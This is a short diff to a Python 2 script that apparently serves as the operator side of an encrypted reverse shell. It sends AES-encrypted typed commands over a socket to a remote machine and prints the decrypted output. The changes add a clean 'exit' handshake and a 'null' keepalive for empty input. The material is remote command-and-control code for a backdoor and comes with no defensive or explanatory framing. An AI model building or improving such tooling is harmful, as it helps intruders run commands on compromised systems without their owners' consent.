@@ -4,6 +4,7 @@ from __future__ import print_function
 import socket
 from Crypto.Cipher import AES
 import base64
+from time import sleep
 
 PADDING = '{'
 
@@ -38,13 +39,20 @@ def sendCommand(conn):
 	while True:
 		data = conn.recv(2048)
 		data = decrypt(cipher, data)
-		print (data, end='')
+		print(data, end='')
 		cmd = raw_input()
 		if cmd == 'exit':
+			cmd = encrypt(cipher, cmd)
+			conn.send(cmd)
+			sleep(1)
 			conn.close()
 			exit()
 		if len(cmd) > 0:
 			cmd = encrypt(cipher, cmd) 
 			conn.send(cmd) 
+		if len(cmd) == 0:
+			cmd = "null"
+			cmd = encrypt(cipher, cmd)
+			conn.send(cmd)
 
 createSocket()
